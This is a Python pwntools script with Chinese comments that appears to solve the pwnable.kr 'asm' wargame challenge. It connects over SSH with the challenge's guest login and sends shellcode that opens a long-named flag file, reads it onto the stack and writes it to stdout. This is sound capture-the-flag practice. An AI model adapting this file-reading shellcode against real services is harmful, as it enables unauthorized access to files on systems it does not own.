#-*- coding:utf-8 -*-
from pwn import *
#还有这种操作
con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')
shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

#字符串存在了栈rsp上面，open函数打开该文件
shellcode += shellcraft.open('rsp', 0, 0)  #应该是sys_open返回到了rax里面,rax中存储了"this_is.."的地址
#读取100个字节长度到缓冲区中，这里是到rsp中
shellcode += shellcraft.read('rax', 'rsp', 100)
#linux下0--->stdin,1--->stdout,2--->stderr.
#write(1,'rsp',100)#相当于将缓冲区中的内容输出
shellcode += shellcraft.write(1,'rsp',100)
# log.info(shellcode)
p.recvuntil('shellcode: ')
print (shellcode+'\n')
p.send(asm(shellcode))
log.success(p.recvline())
